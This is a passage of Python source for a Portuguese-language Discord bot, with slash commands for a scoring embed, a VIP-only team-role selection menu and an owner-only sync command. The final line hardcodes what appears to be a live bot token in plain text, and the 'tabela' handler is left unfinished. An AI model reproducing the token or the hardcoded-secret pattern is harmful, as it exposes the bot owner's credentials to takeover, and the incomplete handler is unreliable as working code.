            "10º-12º Lugar: 1 ponto\n"
        ),
        inline=False
    )

    embed.add_field(
        name=f"{EMOJIS['brilho']}ㅤPONTUAÇÃO POR ABATE",
        value="Cada abate vale 1 ponto",
        inline=False
    )

    await interaction.response.send_message(embed=embed)

@aclient.tree.command(
    name="campcargos",
    description="Cria um embed para pegar cargos da call."
)
async def camp_cargos(interaction: discord.Interaction):
    # Verificando se o usuário tem VIP ou é o dono
    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.response.send_message(
            f"{proibido_emoji} Você precisa ser VIP para utilizar este comando.",
            ephemeral=True
        )
        return

    # Obtendo a imagem do servidor (thumbnail)
    thumbnail_url = interaction.guild.icon.url if interaction.guild.icon else None
    image_url = "https://media.tenor.com/hf6Y0QFVrsEAAAAj/blood-drip-blood.gif"

    # Criando o embed
    embed = discord.Embed(
        title="Pegue seu cargo",
        description="Para pegar o cargo da sua call, abra o menu abaixo e selecione o seu time.",
        color=0xFFFF00
    )

    if thumbnail_url:
        embed.set_thumbnail(url=thumbnail_url)

    embed.set_image(url=image_url)

    # Obtendo os cargos das calls do evento
    roles = [role for role in interaction.guild.roles if role.name.startswith("⭐・")]  # Prefixo para os cargos de time

    # Criando as opções do menu de seleção
    options = [
        discord.SelectOption(
            label=role.name.replace("⭐・", "・"),  # Nome do cargo sem prefixo
            value=str(role.id),
            emoji="<:botao:1336783739090501702>"  # Emoji associado ao menu
        )
        for role in roles
    ]

    # Criando o menu de seleção
    select = discord.ui.Select(
        placeholder="Selecione seu time...",
        options=options
    )

    async def select_callback(interaction: discord.Interaction):
        selected_role_id = int(select.values[0])
        selected_role = interaction.guild.get_role(selected_role_id)

        # Remover todos os outros cargos relacionados ao evento
        for role in roles:
            if role in interaction.user.roles:
                await interaction.user.remove_roles(role)
        liberado="<:permitido:1336370678118617089>"
        # Adicionando o novo cargo selecionado
        await interaction.user.add_roles(selected_role)

        await interaction.response.send_message(
            f"{liberado} Você agora tem o cargo {selected_role.mention}.",
            ephemeral=True
        )

    select.callback = select_callback

    # Criando a view com timeout indefinido
    view = discord.ui.View(timeout=None)
    view.add_item(select)

    # Enviando a mensagem com o embed e a view
    await interaction.response.send_message(embed=embed, view=view)

@aclient.tree.command(name="tabela", description="Cria um embed com os dados da tabela enviada.")
@app_commands.describe(nome_tabela="Nome da tabela que será exibida no embed.")
async def tabela(interaction: discord.Interaction, nome_tabela: str):
    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.response


@aclient.tree.command(name="sync", description="Sincroniza comandos (owner only)")
async def sync(interaction: discord.Interaction):
    if interaction.user.id != DONO_UID:
        return await interaction.response.send_message("Apenas o dono pode usar isso!", ephemeral=True)

    await interaction.response.defer()
    await aclient.tree.sync()
    await interaction.followup.send("Comandos sincronizados!")

aclient.run('OTAwMDk2NjAzOTI1NDA1NzU2.GLqQRr.ZKJEWvYYvrY-Q0sfi2FE0Dz1I0infDvbe75s6w')